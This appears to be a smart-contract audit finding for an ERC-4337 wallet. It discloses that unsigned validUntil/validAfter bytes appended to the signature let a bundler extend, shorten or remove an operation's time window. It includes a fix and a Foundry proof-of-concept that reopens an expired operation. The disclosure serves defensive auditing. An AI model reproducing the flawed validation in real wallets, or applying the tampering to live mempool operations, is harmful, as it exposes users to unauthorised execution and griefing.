# [M-01] Unauthenticated Time Window Parameters Allow Bundler to Tamper with validUntil / validAfter Constraints


## Finding description and impact
AtomWallet supports an extended 77-byte signature format that embeds a 12-byte time window suffix appended after the standard 65-byte ECDSA signature (r, s, v). The two 6-byte fields validUntil and validAfter are intended to express the signer's intent regarding the temporal validity of a UserOperation — constraining it to a specific window defined at signing time.

The critical flaw is that these 12 bytes are never included in the signed digest. The ECDSA signature covers only the ERC-4337 userOpHash — which itself excludes the signature field by ERC-4337 design. Therefore, any party that relays the UserOperation can silently overwrite the time window bytes while leaving the ECDSA signature cryptographically valid.
```solidity
function _extractValidUntilAndValidAfterFromSignature(bytes calldata signature)
    internal pure
    returns (uint48 validUntil, uint48 validAfter, bytes memory rawSignature)
{
    uint256 signatureLength = signature.length;
    if (signatureLength == 65) { return (0, 0, signature); }
    if (signatureLength != 77) {
        revert AtomWallet_InvalidSignatureLength(signatureLength);
    }
    uint256 metaOffset = signatureLength - 12;
    rawSignature = signature[:metaOffset];          // first 65 bytes = ECDSA sig
    bytes memory meta = signature[metaOffset:];     // last 12 bytes = time window
    // ... unpacks validUntil and validAfter from meta
}

function _validateSignature(PackedUserOperation calldata userOp, bytes32 userOpHash)
    internal virtual override returns (uint256 validationData)
{
    (uint48 validUntil, uint48 validAfter, bytes memory signature) =
        _extractValidUntilAndValidAfterFromSignature(userOp.signature);

    // Hash covers ONLY userOpHash — validUntil/validAfter are NOT included
    bytes32 hash = keccak256(abi.encodePacked(
        "\x19Ethereum Signed Message:\n32", userOpHash
    ));

    (address recovered, ECDSA.RecoverError recoverError,) =
        ECDSA.tryRecover(hash, signature);  // signature = 65 ECDSA bytes only

    // ... error handling ...
    bool sigFailed = recovered != owner();
    return _packValidationData(sigFailed, validUntil, validAfter);
    // ^^^^ time window accepted blindly without cryptographic verification
}
```
The digest hashed and signed by the owner is:
```
hash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", userOpHash))
```
userOpHash is computed by the EntryPoint from the UserOperation's core fields (sender, nonce, callData, gas limits, paymaster), but explicitly excludes the signature field. Because validUntil and validAfter are packed inside the signature field, they are entirely outside the cryptographic commitment. They can be freely mutated without invalidating the signature.

##Impact
An attacker - typically a malicious bundler or MEV searcher with access to the mempool can perform the following attacks against any pending UserOperation that uses the 77-byte time-windowed signature format:

Expiry extension: Replace validUntil with a far-future timestamp, executing an operation the signer believed had expired.
Expiry shortening: Replace validUntil with a past timestamp, permanently preventing execution of a valid operation (griefing / DoS).
Delay removal: Replace validAfter with 0 or a past timestamp, executing an operation earlier than the signer intended (front-running a time-lock).
Delay injection: Replace validAfter with a future timestamp to delay execution indefinitely.
Note: The attacker cannot change what the operation does like callData, destination, and value are covered by userOpHash. The ERC-4337 nonce mechanism also prevents replay of an already-executed operation. The impact is limited to when an operation executes, but this alone can be material in protocols that rely on temporal constraints for safety (e.g., time-locked governance actions, expiring approvals, scheduled transfers).

## Recommended mitigation steps
Include validUntil and validAfter as part of the signed digest so that any post-signing modification of the time window bytes invalidates the ECDSA signature.
```solidity
function _validateSignature(
    PackedUserOperation calldata userOp,
    bytes32 userOpHash
) internal virtual override returns (uint256 validationData) {

    (uint48 validUntil, uint48 validAfter, bytes memory signature) =
        _extractValidUntilAndValidAfterFromSignature(userOp.signature);

    // FIX: bind validUntil and validAfter into the signed digest
    bytes32 hash = keccak256(abi.encodePacked(
        "\x19Ethereum Signed Message:\n32",
        userOpHash,
        validUntil,   // <-- added
        validAfter    // <-- added
    ));

    (address recovered, ECDSA.RecoverError recoverError, bytes32 errorArg) =
        ECDSA.tryRecover(hash, signature);

    // ... rest unchanged
}
```
This single change cryptographically binds the time window to the owner's signature. Any bundler that rewrites the suffix will cause ECDSA recovery to return the wrong address, setting sigFailed = true and causing the EntryPoint to reject the operation.

## Proof of Concept
The following Foundry test reproduces the vulnerability end-to-end. It demonstrates that a bundler can replace the time window suffix while keeping the original ECDSA bytes, and the wallet accepts the tampered window with no signature failure.

Run with: `forge test --match-test test_submissionValidity -vvv`
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

import { BaseTest } from "./BaseTest.t.sol";
import { AtomWallet }           from "src/AtomWallet.sol";
import { PackedUserOperation }  from "@account-abstraction/interfaces/PackedUserOperation.sol";


contract PoCCore is BaseTest {
    function test_submissionValidity() external {

        vm.warp(BASE_TIMESTAMP);

        // --- Setup ---
        uint256 ownerPrivKey = 0xA11CE;
        address owner        = vm.addr(ownerPrivKey);
        AtomWallet wallet    = _deployWallet(owner);

        // Construct a UserOperation
        PackedUserOperation memory userOp = _buildUserOp(wallet);
        bytes32 userOpHash = keccak256(abi.encode(userOp));

        // Owner signs ONLY the userOpHash (standard ERC-4337 flow)
        bytes memory ecdsaSig = _sign(ownerPrivKey, userOpHash);

        // --- Step 1. Owner sets a tight time window (expires in 1 second) ---
        uint48 validUntil = uint48(BASE_TIMESTAMP + 1);   // expires almost immediately
        uint48 validAfter = uint48(BASE_TIMESTAMP - 100);
        userOp.signature  = abi.encodePacked(ecdsaSig, validUntil, validAfter);

        vm.prank(address(entryPoint));
        uint256 result = wallet.validateUserOp(userOp, userOpHash, 0);
        _assertWindowEquals(result, validUntil, validAfter);

        // Fast-forward: owner believes window is now expired
        vm.warp(validUntil + 1);
        assertTrue(block.timestamp > validUntil, "should be past expiry");

        // --- Step 2. Attacker (bundler) replaces only the 12-byte time suffix ---
        // The 65-byte ECDSA signature is left completely unchanged
        uint48 attackValidUntil = uint48(block.timestamp + 30 days);
        userOp.signature = abi.encodePacked(ecdsaSig, attackValidUntil, validAfter);
        //                                  ^^^^^^^^^ identical ECDSA bytes
        //                                             ^^^^^^^^^^^^^^^ tampered

        vm.prank(address(entryPoint));
        uint256 tamperedResult = wallet.validateUserOp(userOp, userOpHash, 0);

        // --- Assertions: tampered window accepted with no signature failure ---
        (address aggr, uint48 tUntil, uint48 tAfter) = _parse(tamperedResult);
        assertEq(aggr,   address(0),       "sigFailed must be 0 (sig still valid)");
        assertEq(tUntil, attackValidUntil, "extended window accepted");
        assertEq(tAfter, validAfter,       "validAfter unchanged");

        // Operation can now execute 30 days beyond owner's intended expiry
        assertTrue(block.timestamp <= tUntil, "window is open again after tampering");
    }
}
```
All assertions pass. The tampered validUntil (block.timestamp + 30 days) is returned with sigFailed = 0, demonstrating that the time window modification is fully accepted without any cryptographic rejection.